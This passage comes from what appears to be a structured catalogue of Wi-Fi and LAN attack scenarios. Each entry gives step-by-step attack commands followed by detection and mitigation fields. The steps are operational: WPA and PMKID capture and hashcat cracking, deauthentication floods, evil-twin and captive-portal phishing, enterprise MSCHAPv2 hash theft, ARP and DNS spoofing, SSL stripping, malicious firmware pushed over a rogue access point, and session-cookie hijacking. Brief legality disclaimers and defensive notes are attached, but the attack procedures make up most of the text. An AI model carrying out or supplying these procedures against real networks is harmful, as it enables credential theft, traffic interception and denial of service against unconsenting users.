Step 6: Adjust power and cooling: monitor GPU temperature using nvidia-smi or radeon-profile. Step 7: Test performance improvements versus CPU: GPU may be 10–100x faster. Step 8: You can combine GPU + rules for hybrid attack speed boost. Step 9: Use --benchmark to test which attack modes your GPU performs best in. Step 10: GPU cracking is fast but power-hungry — not ideal for stealth. Use only in approved, monitored environments.
Vulnerability: Password hash cracking susceptible to acceleration
Detection Method: GPU usage spikes; high power draw; GPU-specific forensic logs (NVIDIA driver logs, kernel timestamps)
Solution: Use strong WPA2/WPA3 passwords with length and complexity; apply rate limits; disable legacy protocol support

Title: Cloud Cracking
Scenario Description: WPA/WPA2 handshake hashes are cracked using distributed GPU infrastructure in the cloud for maximum speed and scale.
Attack Steps: Step 1: Capture a valid 4-way WPA handshake and convert it to .hccapx format. Step 2: Sign up for a cloud GPU provider such as AWS (EC2 P-series), Paperspace, or Vast.ai. Step 3: Create a VM or container instance with GPU access. For AWS, choose a p2.xlarge or g4dn instance with NVIDIA GPU. Step 4: Install hashcat, upload the .hccapx file and your dictionary or rule files. Use scp or wget to transfer files securely. Step 5: Run hashcat in the cloud: hashcat -m 22000 -a 0 handshake.hccapx rockyou.txt -w 3. Step 6: Monitor usage and adjust batch size or power limits to avoid overage charges. Step 7: Optionally scale to multiple nodes or use distributed cracking tools like Hashcat with hashtopolis for automation. Step 8: Once password is cracked, download the result and securely delete all data from cloud VM. Step 9: Shut down or delete instance to avoid unexpected billing. Step 10: Cloud cracking is fast and affordable but must be 100% authorized. Always follow cloud provider terms and laws.
Vulnerability: WPA handshake cracking enabled by cloud GPUs
Impact: Fast cracking with scalable GPU infrastructure
Detection Method: Unusual outbound connections; GPU usage in cloud audit logs; unusual OS activity or container spins
Solution: Enforce password complexity; monitor cloud GPU activity logs; disallow .hccapx upload to shared workspaces
Tags: Cloud GPU, WPA Cracking, Distributed Attack

Title: Using PMKID Attack (Alternative)
Scenario Description: Captures the PMKID from a wireless access point without requiring a connected client, allowing silent and fast offline password cracking.
Attack Steps: Step 1: Make sure your wireless network adapter supports monitor mode and packet injection. Recommended chipsets: Atheros or MediaTek. Use airmon-ng to check and enable monitor mode: airmon-ng start wlan0. Step 2: Install hcxdumptool and hcxpcapngtool. These tools can silently request PMKID from an access point without any clients being connected. Step 3: Start PMKID capture: hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1. This command listens for beacons and triggers PMKID requests. Step 4: Let it run for a few minutes. You don’t need any active devices — this works even if no one is connected to the target Wi-Fi. Step 5: Once done, convert the .pcapng capture into hashcat format using: hcxpcapngtool -o pmkid.22000 -E essid.txt -I identities.txt pmkid.pcapng. Step 6: The pmkid.22000 file now contains the captured PMKIDs. Step 7: Start cracking with hashcat: hashcat -m 22000 -a 0 pmkid.22000 rockyou.txt. This will try all passwords in the list against the PMKID hash. Step 8: If the password is weak or reused (like admin123), hashcat will crack it. The cracked key lets you connect to the network or decrypt traffic. Step 9: This method is faster than handshake capture, doesn't disconnect clients, and works even on sleeping networks. Step 10: Protect your Wi-Fi using strong, non-dictionary passwords and WPA3 where possible.
Detection Method: Detect repeated PMKID requests; monitor beacon frame anomalies and frame injection attempts
Solution: Use WPA3 where possible; rotate WPA2 keys; enforce long random passphrases; monitor for beacon injection attempts
Tags: PMKID, WPA2 Cracking, Clientless, Offline Attack

Title: Passive PMKID Capture
Scenario Description: Capture PMKID passively from the AP without sending any packets — 100% silent, effective even without clients.
Attack Steps: Step 1: Ensure your Wi-Fi card supports monitor mode and injection (chipsets: Atheros, Realtek, etc.). Use airmon-ng start wlan0 to enable monitor mode. Confirm it’s in monitor mode using iwconfig. Step 2: Install hcxdumptool. It allows passive sniffing for PMKID hashes. Step 3: Run the following command to passively listen for PMKID: hcxdumptool -i wlan0mon -o passive.pcapng --enable_status=15. This listens for beacons and captures PMKID if any APs broadcast it. Step 4: Let it run near the target AP for several minutes. You are not sending any packets, so this remains completely stealthy. Step 5: After enough time (5–20 minutes), stop the capture using Ctrl+C. Step 6: Convert the .pcapng capture file to hashcat format: hcxpcapngtool -o pmkid.22000 passive.pcapng. Step 7: You now have the PMKID hash ready for cracking. Proceed with offline brute-force or dictionary attack. Step 8: This method works especially well on misconfigured routers that auto-respond with PMKID. Step 9: No deauths or associations required — great for stealth labs or red team ops. Step 10: Delete the capture or encrypt it when done; never share real captures from production without permission.
Detection Method: Monitor beacon rates, frame types, and scan anomalies
Solution: Disable PMKID support on AP; Use WPA3 or proper WPA2 configuration

Title: Active PMKID Request
Scenario Description: Actively sends association request to trigger AP into giving PMKID — fast and more reliable than passive capture.
Attack Steps: Step 1: Use a compatible Wi-Fi card (must support packet injection). Place it in monitor mode with airmon-ng start wlan0. Confirm with iwconfig wlan0mon. Step 2: Install hcxdumptool from GitHub or package manager. Step 3: Launch active PMKID capture with: hcxdumptool -i wlan0mon -o active.pcapng --active_beacon --enable_status=1. This sends crafted association requests to trigger the AP to respond with PMKID. Step 4: Let it run for a few minutes — it will attempt PMKID extraction from all visible access points. Step 5: Once capture is complete, press Ctrl+C and convert the .pcapng to Hashcat format using: hcxpcapngtool -o active.22000 active.pcapng. Step 6: Analyze the .22000 file to confirm a PMKID hash is captured. Step 7: Proceed to brute-force or dictionary cracking. This method is faster and has higher success than passive capture but less stealthy. Step 8: Works well in lab environments or pen-testing with authorization. Step 9: Avoid running in production networks without legal permission. Step 10: Combine with Wi-Fi recon tools like airodump-ng to filter and select specific BSSIDs (APs) for targeting.
Vulnerability: APs respond to crafted association requests
Impact: WPA key recovery via fake handshake simulation
Detection Method: Detect spoofed association attempts; alert on frequent auth requests from non-clients
Solution: Harden WPA2 configs; disable fast roaming where possible; implement WPA3 where supported

Title: Offline Brute Force / Dictionary Attack
Attack Type: WPA2 Key Recovery from PMKID Hash
Scenario Description: Uses captured PMKID (passively or actively) and applies brute-force or dictionary attacks to crack the WPA2 key offline.
Attack Steps: Step 1: Ensure you have a PMKID hash file (e.g., pmkid.22000) either from active or passive methods above. Step 2: Download a large password list (e.g., rockyou.txt or SecLists) or generate your own based on likely passwords (e.g., name+birthdate). Step 3: Install hashcat, and ensure your GPU is detected with hashcat -I. If no GPU, hashcat can still run on CPU but slower. Step 4: Run the following command: hashcat -m 22000 pmkid.22000 rockyou.txt -w 3. This starts a dictionary attack using rockyou. Step 5: You will see cracking progress, hash rate, and estimated time. Let it run — password will be shown if found. Step 6: You can use a brute-force mask instead if partial format is known (e.g., John?d?d?d?d for John1995). Step 7: If successful, the cracked password can be used to join the Wi-Fi network. Step 8: Try different lists and rules (e.g., -r rules/best64.rule) to expand guesses. Step 9: Save cracked credentials securely. Never use cracked passwords on unauthorized networks. Step 10: Practice only in test labs or CTFs. Using stolen PMKIDs without permission is illegal.
Vulnerability: Weak WPA2 password used by target AP
Detection Method: Log review of abnormal traffic; failed access attempts; packet injection detection
Solution: Use long WPA2 passphrases; rotate keys regularly; avoid dictionary words as passwords
Tags: Brute Force, Dictionary, PMKID, WPA2 Cracking

Title: SSID-specific Rainbow Tables
Scenario Description: Uses precomputed hashes (rainbow tables) for known SSID (e.g., "linksys", "default", "NETGEAR") to crack WPA/WPA2 PSKs instantly if they match.
Attack Steps: Step 1: Understand that WPA2 PSK hashes depend on both the password and SSID. So rainbow tables must be generated specifically for each SSID (e.g., for SSID "linksys"). Step 2: Download or generate rainbow tables for common SSIDs (you can find them online or use genpmk). Example command: genpmk -f rockyou.txt -d rainbow/ -s linksys → this creates a table with hashes for each word in rockyou.txt for SSID "linksys". Step 3: Capture a WPA2 handshake using airodump-ng. First, enable monitor mode: airmon-ng start wlan0, then airodump-ng wlan0mon -w handshake --bssid <target_bssid> --channel <ch> to capture handshake. Step 4: Deauth a connected client to force handshake: aireplay-ng --deauth 5 -a <bssid> wlan0mon. Wait until you see “WPA handshake” message in airodump-ng. Step 5: Use cowpatty with the handshake and precomputed table: cowpatty -r handshake.cap -d rainbow/linksys -s linksys. Step 6: If the PSK exists in the rainbow table for that SSID, cowpatty will crack it instantly. Step 7: If not successful, create a new rainbow table with a larger or more targeted wordlist using genpmk. Step 8: You can also automate this using rainbowcrack or combine it with tools like aircrack-ng for dictionary fallback. Step 9: Store cracked passwords securely and only use this in authorized penetration testing environments. Step 10: This method is only effective when the target SSID is known and rainbow tables are available or generated for that SSID.
Impact: Instant PSK recovery if match found
Detection Method: Monitor for table-based cracking attempts; watch for reuse of common SSIDs and weak passphrases
Solution: Change SSID to uncommon name; enforce random, long WPA2 passphrases; implement WPA3 if supported

Title: Evil Twin AP
Scenario Description: Creates a fake AP with the same SSID as a real network. Victims unknowingly connect to it, enabling traffic interception, credential theft, or MITM.
Attack Steps: Step 1: Identify the target network using airodump-ng wlan0mon. Find the SSID and BSSID of the real access point. Step 2: Start monitor mode: airmon-ng start wlan0. Step 3: Clone the SSID using airbase-ng: airbase-ng -e "TargetSSID" -c <channel> wlan0mon. This creates a fake access point with the same name as the real one. Step 4: Use iptables and dnsmasq to provide DHCP and redirect DNS requests. Step 5: Optionally, launch a phishing portal using Fluxion to capture WPA passwords: ./fluxion.sh. Choose the network, handshake capture, then start the cloned AP with a captive portal. Step 6: Deauthenticate users from the real AP using aireplay-ng --deauth 10 -a <BSSID> wlan0mon. This forces devices to auto-connect to your evil twin. Step 7: If phishing is enabled, the user sees a fake login page asking for the Wi-Fi password. Step 8: When victim submits it, the tool verifies it in real time and shows it as “correct” or “incorrect”. Step 9: Once captured, disconnect the AP and secure logs. Step 10: Only perform this in lab or legal penetration testing — this is illegal on real networks.
Detection Method: Monitor for duplicate SSIDs; use wireless intrusion detection systems (WIDS); enforce 802.11w
Solution: Use WPA3, enable SSID randomization, verify BSSID before connecting, use VPN on public Wi-Fi
Tags: Evil Twin, MITM, Rogue AP, Wi-Fi Phishing

Title: Open Fake AP
Scenario Description: Sets up a completely open AP with a common or generic SSID to attract users. Once connected, attacker can inspect traffic or launch phishing attacks.
Attack Steps: Step 1: Start monitor mode: airmon-ng start wlan0. Step 2: Use hostapd to set up an open access point: configure /etc/hostapd/hostapd.conf with SSID (e.g., “FreeWiFi”). Set encryption to open. Step 3: Launch a DHCP server using dnsmasq to assign IPs and route traffic. Configure /etc/dnsmasq.conf to hand out local IPs and redirect all DNS to local page. Step 4: Run hostapd /etc/hostapd/hostapd.conf and dnsmasq in another terminal. Step 5: Optionally, use Wifiphisher for a GUI-based flow: ./wifiphisher. Select a scenario such as fake firmware update or captive portal to phish credentials. Step 6: Wait for devices to connect — open networks attract phones, tablets, etc. Step 7: Victims receive a fake update/login/phishing page, often disguised as public Wi-Fi T&Cs or Google login. Step 8: Log submitted credentials and redirect users to real sites for realism. Step 9: Monitor traffic using Wireshark or tcpdump for sensitive info (if not encrypted). Step 10: Shut down tools after test and delete logs if necessary. Use for legal ethical hacking only.
Detection Method: Detect unauthorized open SSIDs; log rogue AP MACs; notify on new unknown APs
Solution: Avoid connecting to unknown open networks; use mobile data/VPN in public; disable auto-connect to open Wi-Fi
Tags: Open AP, Wifiphisher, Captive Portal, MITM

Title: Captive Portal Phishing
Attack Type: Fake Login Page on Rogue AP
Scenario Description: Uses a fake captive portal (login page) hosted on a rogue AP. Tricks users into entering Wi-Fi or social credentials before allowing internet access.
Attack Steps: Step 1: Set up monitor mode: airmon-ng start wlan0. Step 2: Run Wifiphisher or Fluxion to create a rogue AP. These tools automate the setup of hostapd + dnsmasq + phishing templates. Step 3: Use tool interface to select the SSID to spoof (e.g., Starbucks_WiFi), and select the attack method: “Captive Portal Authentication”. Step 4: Launch the attack — the fake AP appears with identical SSID. Step 5: Deauth clients from real AP with aireplay-ng --deauth 10 -a <BSSID> wlan0mon, causing auto-connect to rogue AP. Step 6: Once connected, victims are redirected to a fake captive portal that resembles legitimate login pages. Step 7: Portal asks for Wi-Fi password, Google/Facebook login, or email. Step 8: Credentials are logged in real-time and shown in the tool’s console or saved to disk. Step 9: After phishing, user may be redirected to actual internet or shown “Access Denied” page. Step 10: Use this attack only for educational or red team assessment in a closed lab environment. Never target live production networks without legal permission.
Vulnerability: Trusting captive portals, no cert validation
Detection Method: Monitor captive portal DNS redirects; alert on duplicate APs; use 802.1X auth if possible
Solution: Train users not to trust captive pages; use two-factor auth; VPN tunneling on all open Wi-Fi
Tags: Captive Portal, Wi-Fi Phish, Evil Twin

Title: Fake Enterprise WPA2 AP
Scenario Description: Creates a fake enterprise AP using same SSID to trick enterprise clients into connecting and capturing MSCHAPv2 hashes for offline cracking.
Attack Steps: Step 1: Install or use Kali Linux, which includes hostapd-wpe. Step 2: Navigate to hostapd-wpe config directory, usually /etc/hostapd-wpe/hostapd-wpe.conf. Step 3: Edit the config file to match the target enterprise SSID (e.g., ssid=CorpNet), set eap_user_file and ca_cert for default values. Step 4: Start hostapd-wpe: hostapd-wpe hostapd-wpe.conf. This launches a fake WPA2-Enterprise access point using EAP methods like PEAP or TTLS. Step 5: Use aireplay-ng to deauthenticate users from the real corporate AP: aireplay-ng --deauth 10 -a <real_BSSID> wlan0mon. This forces users to reconnect — if they auto-join your rogue AP, their credentials will be sent for EAP handshake. Step 6: Watch the terminal for username and challenge/response MSCHAPv2 hashes. Step 7: Save the captured hash to a file for offline cracking. Use asleap or hashcat with mode 5500: hashcat -m 5500 hash.txt wordlist.txt. Step 8: If the password is weak or reused, it will be cracked quickly. Step 9: Crack the password offline and test it against VPN, email, or intranet if legally allowed. Step 10: Use only for authorized red teaming — never on real corp networks without written approval.
Impact: MSCHAPv2 hash theft, enterprise credential reuse
Detection Method: Wireless IDS for rogue APs; log unexpected EAP attempts
Solution: Implement 802.1X with certificate validation; educate users to never approve unknown certs

Title: Deauth Legit AP
Scenario Description: Sends deauth frames to disconnect clients from real AP, making them auto-connect to rogue AP (Evil Twin, hostapd-wpe, phishing setups).
Attack Steps: Step 1: Enable monitor mode: airmon-ng start wlan0. Step 2: Discover nearby APs using airodump-ng wlan0mon. Identify target AP’s BSSID and channel. Step 3: To disconnect all users from the AP, run: aireplay-ng --deauth 0 -a <BSSID> wlan0mon. This sends infinite deauth packets, forcing all clients to disconnect. Step 4: You can also target specific clients using their MAC: aireplay-ng --deauth 10 -a <AP BSSID> -c <client MAC> wlan0mon. Step 5: This is useful when combined with rogue AP attacks (Evil Twin, Fake Enterprise AP), as users reconnect to the attacker’s AP. Step 6: Be cautious — this causes real denial-of-service. It’s illegal unless done in a controlled lab or authorized pentest. Step 7: Monitor reconnection attempts using airodump-ng and capture handshakes or credentials. Step 8: Stop deauth attack with Ctrl+C. Use responsibly only in test networks or red team simulations.
Impact: Disconnect users, push them to attacker AP
Detection Method: Unusual client disconnect patterns; WIDS alerts on excessive deauths
Solution: Enable Management Frame Protection (802.11w); monitor for rogue traffic

Title: DNS Spoofing
Scenario Description: Intercepts and modifies DNS responses to redirect victims to malicious or fake websites (phishing portals, malware delivery sites).
Attack Steps: Step 1: Connect to same LAN as target or set up MITM position using ARP spoofing: ettercap -T -q -i eth0 -M arp:remote /victim_IP/ /gateway_IP/. Step 2: Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward. Step 3: Run a DNS spoofing tool like dnsspoof: dnsspoof -i eth0 -f spoofhosts.txt, where spoofhosts.txt maps domains to your attacker IP (e.g., 192.168.1.100 facebook.com). Step 4: As the victim browses the web, your spoofed DNS replies redirect them to your fake sites. Step 5: Host fake login pages (e.g., phishing page for Gmail or Facebook) using Apache or Flask. Step 6: Collect credentials submitted to the phishing form. Step 7: Monitor for DNS requests using Wireshark or tcpdump port 53. Step 8: When finished, kill all MITM tools and restore IP forwarding: echo 0 > /proc/sys/net/ipv4/ip_forward. Step 9: DNS spoofing is extremely effective in LAN environments where DNS is not encrypted. Step 10: Always test in isolated lab or legal assessments. Never intercept DNS in live environments without consent.
Detection Method: DNSSEC validation failure; unusual domain resolution patterns
Solution: Use DNS over HTTPS/TLS; enable DNSSEC validation; never trust unknown DNS responses

Title: SSL Strip
Scenario Description: Downgrades secure HTTPS connections to HTTP in a MITM scenario, tricking users into sending credentials unencrypted.
Attack Steps: Step 1: Connect to the same network as the target (e.g., public Wi-Fi). Step 2: Start MITM position using ARP spoofing: ettercap -T -q -i wlan0 -M arp:remote /victimIP/ /gatewayIP/. Step 3: Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward. Step 4: Start sslstrip: sslstrip -l 10000. This listens on port 10000 and rewrites all HTTPS → HTTP. Step 5: Use iptables to redirect port 80 to 10000: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000. Step 6: Victim visits a site (e.g., http://gmail.com → redirected HTTP version), unaware it's insecure. Step 7: Login credentials are sent in plaintext and captured by sslstrip. Step 8: View logs in /root/sslstrip.log for stolen usernames and passwords. Step 9: To stop, run iptables -F and echo 0 > /proc/sys/net/ipv4/ip_forward. Step 10: Works only when HSTS is not enforced. Modern sites block it, so test only on lab/demo pages.
Vulnerability: Lack of HTTPS enforcement, no HSTS
Detection Method: Use HSTS preload lists; monitor for downgrade attempts; log port 80 redirections
Solution: Enforce HTTPS via HSTS headers; use browser plugins like HTTPS Everywhere; train users to verify lock icon
Tags: SSL Strip, HTTPS Downgrade, MITM, Ettercap

Title: Fake Internet Access Portal
Scenario Description: Hosts a fake “public Wi-Fi” login or payment page (like hotels or cafes) to steal login credentials or credit card data.
Attack Steps: Step 1: Setup an open AP using hostapd. Edit /etc/hostapd/hostapd.conf to use SSID like FreeHotelWiFi. Set auth_algs=1 to allow open access. Step 2: Use nodogsplash or CaptiveFlask to redirect any HTTP request to your local fake login/payment portal. Step 3: If using CaptiveFlask, clone a real-world captive page (e.g., hotel login or "Pay $5 for Wi-Fi") into an HTML Flask app. Step 4: Start your fake AP: hostapd hostapd.conf. Step 5: Start DHCP server (e.g., dnsmasq) to give users IPs and set redirect to your portal. Step 6: Start your Flask portal on port 80: python3 fakeportal.py. Step 7: Users connect to open Wi-Fi, and any HTTP site they open redirects to your phishing page. Step 8: When users submit credentials (e.g., email, room number, or card), log the data to a file. Step 9: Optionally redirect to real internet after logging to make it look legit. Step 10: Shut down tools and analyze logs. Only use this for phishing simulation or legal red team testing.
Vulnerability: Trusting open AP + captive portal flow
Detection Method: Monitor unauthorized portals; validate captive domains; IDS for fake DNS/DHCP offers
Solution: Educate users; use 802.1X + HTTPS splash pages; block rogue DHCP servers
Tags: Captive Portal, Fake Hotel WiFi, Nodogsplash

Title: Probe Response Spoofing
Scenario Description: Sends spoofed responses to probe requests, tricking devices into thinking a known network is nearby — often used in Evil Twin-style attacks.
Attack Steps: Step 1: Enable monitor mode: airmon-ng start wlan0. Step 2: Capture probe requests using airodump-ng wlan0mon — look at the “Probes” column to see what SSIDs devices are requesting (e.g., “MyHomeWiFi”). Step 3: Use airbase-ng to create a fake AP with one of these SSIDs: airbase-ng -e MyHomeWiFi -c 6 wlan0mon. Step 4: This causes devices searching for “MyHomeWiFi” to automatically connect, thinking it’s their real network. Step 5: Once connected, you can intercept traffic, serve fake captive portals, or run credential/phishing attacks. Step 6: You can automate this with bettercap: bettercap -iface wlan0 -caplet wifi-autopwn.cap. It listens for probes and spoofs responses dynamically. Step 7: Monitor captured data with Wireshark on the virtual interface at0 or tap0. Step 8: This technique works best when victims have auto-connect enabled and saved SSIDs. Step 9: Combine with DNS spoofing or SSL stripping for full MITM impact. Step 10: Disable after testing and analyze logs. Legal usage only in controlled environments.
Vulnerability: Auto-connect to known SSID without validation
Detection Method: Wireless IDS that monitors SSID spoofing; alert on duplicate SSIDs in same area
Solution: Educate users to disable auto-connect; use VPN on public Wi-Fi; OS-level SSID filtering
Tags: Probe Spoofing, Wi-Fi Hijack, SSID Cloning

Title: Fake IoT or App Update AP
Scenario Description: Attacker sets up a rogue AP mimicking the trusted Wi-Fi used by IoT devices or apps, tricks them into downloading malicious firmware or app updates.
Tools Used: hostapd, airbase-ng, dnsmasq, fake update server
Attack Steps: Step 1: Use airmon-ng start wlan0 to enable monitor mode. Step 2: Use airodump-ng wlan0mon to identify target IoT device or mobile apps' preferred SSID (e.g., "SmartHome", "MyApp_OTA"). Step 3: Create a rogue AP with same SSID using airbase-ng: airbase-ng -e SmartHome -c 6 wlan0mon. Or use hostapd with a config like: ssid=SmartHome and interface=wlan0. Step 4: Set up a DHCP server (e.g., dnsmasq) to assign IPs and route all DNS requests to your attacker's IP. Example dnsmasq.conf includes: interface=wlan0, dhcp-range=192.168.1.10,192.168.1.100,12h, address=/#/192.168.1.1. Step 5: Start a fake update server on port 80/443 using Flask, Node.js, or Apache, hosting files with the same name as legitimate updates (e.g., update.bin, firmware.pkg, app.apk). Step 6: When IoT devices or apps connect to your rogue AP (due to same SSID and better signal), they’ll initiate their normal update request. Step 7: Your server replies with a malicious or fake update package. If the device does not verify digital signatures, it will install the malicious file. Step 8: Monitor requests to ensure the device fetched and applied the update. You can modify firmware, inject backdoors, or crash the device. Step 9: Combine with DNS spoofing if needed to resolve update domains (e.g., update.devicevendor.com) to your server. Step 10: Shut down AP and analyze captured behavior. This only works when device/app lacks signature validation — test only in legal, lab settings.
Detection Method: Monitor for unsigned firmware installs; validate DNS logs; check for traffic to spoofed update servers
Solution: Enforce update signature validation; use DNSSEC; restrict IoT updates to known networks
Tags: Evil Twin, IoT Exploit, OTA Hijack, MITM

Title: Evil Twin Creation
Scenario Description: Attacker clones the SSID of a legitimate network (e.g., Starbucks_WiFi) and creates a rogue AP with better signal strength to trick users into connecting.
Attack Steps: Step 1: Enable monitor mode on your Wi-Fi adapter: airmon-ng start wlan0. Step 2: Scan nearby networks with airodump-ng wlan0mon and identify the SSID (e.g., Starbucks_WiFi) and its channel. Step 3: Launch fake AP using airbase-ng: airbase-ng -e Starbucks_WiFi -c 6 wlan0mon. This creates a cloned AP on channel 6 with same SSID. Step 4: Alternatively, use hostapd with a config: interface=wlan0, ssid=Starbucks_WiFi, channel=6, auth_algs=1. Step 5: Start DHCP server (dnsmasq) to assign IPs to victims and route their traffic. Step 6: Most clients automatically connect to strongest SSID match, so they’ll connect to attacker AP if signal is better or real AP is temporarily offline.
Detection Method: Wireless IDS that detects duplicate SSIDs; anomaly in BSSID or signal behavior
Solution: Use 802.1X certificate validation; monitor for rogue BSSIDs; use VPN when on public Wi-Fi
Tags: Evil Twin, SSID Clone, Rogue AP

Title: Deauthentication Attack
Scenario Description: Sends fake deauth packets to force users off the real AP, making them reconnect and likely attach to the rogue Evil Twin AP set up by the attacker.
Attack Steps: Step 1: Identify the victim’s MAC address and target AP’s BSSID using airodump-ng wlan0mon. Step 2: Run: aireplay-ng --deauth 10 -a <AP_BSSID> -c <client_MAC> wlan0mon to send 10 deauth frames to that client. Step 3: Or target all clients with: aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon for continuous deauth flood. Step 4: This causes the client to disconnect from the real network. If an Evil Twin with better signal is present, clients may auto-connect. Step 5: Use with Evil Twin AP to trap users. Step 6: Monitor reconnections using airodump-ng and confirm victims switched to your rogue AP. Step 7: Stop attack with Ctrl+C. Only use in lab or legal testing.
Impact: Disconnect victims, redirect to rogue AP
Detection Method: High rate of disconnection logs; WIDS alerts for excessive deauth frames
Solution: Implement 802.11w (MFP) to authenticate management frames; restrict open Wi-Fi if unnecessary
Tags: Deauth, Wi-Fi DoS, Evil Twin Support

Title: Captive Portal Injection
Scenario Description: After client connects to Evil Twin, attacker injects a phishing captive portal (e.g., login form, payment request) to steal credentials or card info.
Attack Steps: Step 1: After setting up Evil Twin and DHCP, redirect HTTP requests using a captive portal solution like Wifiphisher or nodogsplash. Step 2: If using Wifiphisher, run: wifiphisher -aI wlan0 -jI wlan1 (1 adapter for AP, 1 for Internet spoofing). Step 3: Wifiphisher auto-creates AP, handles DHCP, and injects phishing pages (e.g., fake login, firmware update prompt). Step 4: Alternatively, use Flask to create a custom login page (e.g., “Please login to access Free Wi-Fi”). Step 5: Serve this page using Python HTTP server or Apache on port 80. Step 6: Redirect all HTTP requests to your portal using dnsmasq or iptables. Step 7: When users connect and submit credentials, capture and store them in a backend file. Step 8: Optionally redirect user to real page to reduce suspicion. Step 9: Combine with sslstrip or DNS spoofing to enhance phishing. Step 10: Analyze logs after test. Legal use only in testbeds or with written approval.
Vulnerability: No HTTPS or captive portal validation
Detection Method: IDS detecting portal redirection; WAFs or DNS logs showing unverified login domains
Solution: Train users to avoid entering passwords on captive portals; use only HTTPS portals; VPN tunneling

Title: SSL Stripping
Scenario Description: Downgrades secure HTTPS to HTTP using a man-in-the-middle setup. Victims unknowingly send login credentials in plaintext, which are intercepted by the attacker.
Attack Steps: Step 1: Connect to the same network as the victim, such as public Wi-Fi or lab LAN. Step 2: Enable IP forwarding on your Linux system to allow packet routing: echo 1 > /proc/sys/net/ipv4/ip_forward. Step 3: Launch ARP spoofing with Ettercap to position yourself between the victim and the gateway: ettercap -T -M arp:remote /victimIP/ /gatewayIP/ -i wlan0. Step 4: Set up iptables to redirect HTTP traffic to sslstrip: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000. Step 5: Start sslstrip: sslstrip -l 10000. It will intercept and downgrade HTTPS requests to HTTP silently. Step 6: Victim types in a secure site like https://gmail.com, which gets downgraded to http://gmail.com. Step 7: Victim logs in, and credentials are sent in plaintext. Step 8: View captured credentials in /root/sslstrip.log or specified file. Step 9: Optionally use mitmproxy in similar fashion for visibility and scripts. Step 10: Shut down tools after capture: flush iptables (iptables -F) and disable IP forwarding. Note: This method fails on HSTS-enforced websites like Google/Facebook (which force HTTPS). Works best on test sites or apps without HTTPS.
Vulnerability: No HTTPS enforcement, lack of HSTS
Detection Method: Monitor logs for HTTP downgrade; check for use of port 10000 or ARP spoofing tools
Solution: Enforce HTTPS using HSTS; install browser HTTPS plugins; avoid open/public Wi-Fi or use VPN

Title: DNS Spoofing
Scenario Description: Intercepts DNS requests and responds with forged IP addresses, redirecting victims to fake sites (phishing, malware, etc.)
Attack Steps: Step 1: Ensure you are on the same network as the victim (e.g., public Wi-Fi or test LAN). Step 2: Start ARP spoofing so the victim’s DNS requests route through you. Use: ettercap -T -M arp:remote /victimIP/ /gatewayIP/ -i wlan0. Step 3: Use dnsspoof to intercept and respond to DNS requests. Create a spoof file (spoof.txt) with entries like 192.168.1.100 facebook.com. Step 4: Start dnsspoof: dnsspoof -i wlan0 -f spoof.txt. It will respond to any DNS request from the victim with the IP you specify. Step 5: Set up a web server (e.g., Apache, Flask, Node) at 192.168.1.100 that serves a fake version of the targeted site (e.g., clone of Facebook login). Step 6: When the victim enters facebook.com in their browser, they are silently redirected to your fake site instead of the real one. Step 7: When they log in, credentials are sent to your server and stored in logs. Step 8: To enhance realism, use SSL on your fake server with self-signed or Let's Encrypt certs. Step 9: View credentials or session tokens, then shut down dnsspoof and ARP spoofing. Step 10: Combine with phishing or malware delivery techniques for further attack. This works especially well in IoT environments or when DNSSEC is not used.
Vulnerability: No DNSSEC, trusting first DNS response
Impact: Redirection to phishing or malware domains
Detection Method: Check logs for sudden DNS resolution changes; validate DNS signatures (if DNSSEC enabled)
Solution: Use DNSSEC; configure endpoints to validate DNS records; avoid public Wi-Fi without VPN

Title: Packet Sniffing
Scenario Description: Attacker captures raw network traffic to analyze protocols, extract plaintext credentials, monitor sessions, and enumerate targets.
Attack Steps: Step 1: Gain access to the same Layer 2 network as the victim (public Wi-Fi, LAN, or rogue access point). Step 2: Put your wireless card into monitor mode (Wi-Fi) or use promiscuous mode for wired: ifconfig eth0 promisc or airmon-ng start wlan0. Step 3: Start packet capture with tcpdump: tcpdump -i wlan0 -w capture.pcap or launch Wireshark GUI and select appropriate interface. Step 4: Apply filters in Wireshark to focus on credentials or interesting data: http.auth, ftp.request, smtp, or tcp contains "password". Step 5: Let capture run while victim browses or logs in. Step 6: Stop capture and inspect PCAP for sensitive info like usernames, passwords (FTP, Telnet), cookies, session tokens. Step 7: Save logs and export as needed. Step 8: Optionally automate analysis using tshark or pcapgrep. Step 9: Combine with ARP spoofing or Evil Twin to increase capture scope. Step 10: Only works on unencrypted or weakly encrypted traffic; HTTPS blocks visibility into payloads.
Detection Method: Monitor interfaces in promiscuous mode; check for unknown packet captures
Solution: Use encrypted protocols (HTTPS, SSH, SFTP); segment networks; enable switch port security

Title: Session Hijacking
Scenario Description: Captures session cookies or tokens from unsecured connections (e.g., HTTP or poorly protected apps) and reuses them to impersonate users.
Attack Steps: Step 1: Set up man-in-the-middle position using ARP spoofing or Evil Twin (see earlier attacks). Step 2: Launch ferret to capture HTTP session data: ferret -i wlan0. Step 3: Launch hamster in browser: hamster & hamster-server. Step 4: Browse hamster dashboard to list captured sessions and URLs. Step 5: Click to replay captured session as the victim (no password needed). Step 6: Alternatively, use Wireshark to capture HTTP headers and extract session cookies manually via http.cookie filter. Step 7: Copy cookie value and inject into your own browser via browser dev tools (e.g., Application → Cookies → Add cookie). Step 8: Access victim’s account if session is still valid. Step 9: This works only if site uses HTTP or doesn't set Secure and HttpOnly flags on cookies. Step 10: Use mitmproxy as a modern tool for real-time session analysis and manipulation in HTTPS-downgraded environments.
Vulnerability: Lack of HTTPS or secure cookie flags
Detection Method: Analyze session logs for reuse from multiple IPs or device fingerprints
Solution: Enforce HTTPS; set Secure, HttpOnly, and SameSite on session cookies; terminate sessions on anomaly

Title: Credential Harvesting
Scenario Description: Intercepts usernames, passwords, and other secrets sent in plaintext or weak protocols using sniffing, phishing, or fake portals.
